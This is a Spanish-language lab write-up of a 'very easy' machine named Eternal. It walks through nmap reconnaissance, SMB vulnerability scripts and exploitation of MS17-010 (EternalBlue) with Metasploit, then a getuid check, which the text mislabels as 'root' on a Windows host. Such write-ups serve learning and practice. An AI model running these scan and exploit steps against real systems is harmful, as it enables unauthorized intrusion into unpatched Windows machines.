---
description: '🔍 Dificultad: Muy Fácil'
---

# Eternal

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.70
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1102).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.70 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1103).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los **puertos 135, 139, 445, 5357**, y varios puertos en el rango 49152-49157 están abiertos. Estos pertenecen a los servicios de **Microsoft RPC, NetBIOS-SSN, Microsoft-DS, WSDAPI**, y puertos desconocidos, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p135,139,445,5357 -v 192.168.1.70
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1104).png" alt=""><figcaption></figcaption></figure>

Estamos ante un Windows 7. Revisamos el puerto 445.

```bash
nmap -p445 --script="smb-vuln-*" 192.168.1.70
```

<figure><img src="../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Vamos explotar MS17-010 con Metasploit conocida como EternalBlue.

```bash
set RHOSTS 192.168.1.70
exploit
```

<figure><img src="../../.gitbook/assets/image (1106).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
getuid
```

aún somos **root.**

<figure><img src="../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>
